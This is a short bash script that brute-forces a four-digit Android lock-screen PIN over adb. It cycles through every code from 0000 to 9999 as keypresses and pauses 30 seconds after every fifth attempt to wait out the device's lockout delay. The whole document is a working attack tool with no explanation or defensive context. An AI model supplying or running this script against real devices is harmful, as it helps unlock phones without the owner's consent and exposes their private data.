#!/usr/bin/env bash

brutepin4digit() {
    adb shell input keyevent 26 # Pressing the lock button
    adb shell input keyevent 82

    echo "Brute Pin 4 Digit"
    for i in {0000..9999}; do
        echo "Try =>" "$i"

        for ((j = 0; j < ${#i}; j++)); do
            adb shell input keyevent $(($(echo "${i:$j:1}") + 7))
        done

        adb shell input keyevent 66

        if ! (($(expr "$i" + 1) % 5)); then
            adb shell input keyevent 66
            echo "Delay Limit 30s"
            sleep 30
            adb shell input keyevent 82
            adb shell input swipe 407 1211 378 85
        fi
    done
}
